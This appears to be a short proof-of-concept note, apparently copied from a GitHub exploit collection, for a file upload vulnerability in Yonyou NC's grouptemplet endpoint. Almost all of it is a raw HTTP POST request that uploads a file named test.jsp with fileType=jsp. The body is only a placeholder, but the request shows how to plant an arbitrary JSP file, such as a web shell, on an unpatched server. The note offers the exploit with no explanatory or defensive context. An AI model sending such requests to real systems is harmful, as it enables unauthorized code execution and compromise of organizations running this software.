# yonyounc_grouptemplet_fileupload

from: https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC_grouptemplet%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
2024.4.22 @2 

```
POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
User-Agent: Mozilla/5.0 

------WebKitFormBoundaryEXmnamw5gVZG9KAQ
Content-Disposition: form-data; name="file"; filename="test.jsp"
Content-Type: application/octet-stream

111111111111111111111
------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
```
